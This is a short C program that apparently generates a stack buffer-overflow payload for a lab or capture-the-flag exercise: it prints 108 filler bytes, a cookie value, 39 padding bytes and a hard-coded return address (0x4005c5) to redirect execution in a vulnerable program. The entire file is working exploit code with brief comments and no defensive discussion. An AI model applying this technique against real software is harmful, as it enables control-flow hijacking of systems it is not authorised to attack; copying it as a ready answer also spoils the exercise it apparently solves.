#include <stdio.h>

int main() {
	unsigned int i;
	//fill the char buffer
	for(i = 0; i < 108; i++){
		printf("a");
	}
	//print the cookie variable
	printf("dbcg");
	//print some unneeded data as offset to the jump adress
	for(i = 0; i < 39; i++){
		printf("%c", 0);
	}
	//print the correct adress for the jump
	printf("%c%c%c%c", (0x4005c5 & 0xFF000000) >> 24, 0x4005c5 & 0xFF, (0x4005c5 & 0xFF00) >> 8, (0x4005c5 & 0xFF0000) >> 16);

	return 0;
}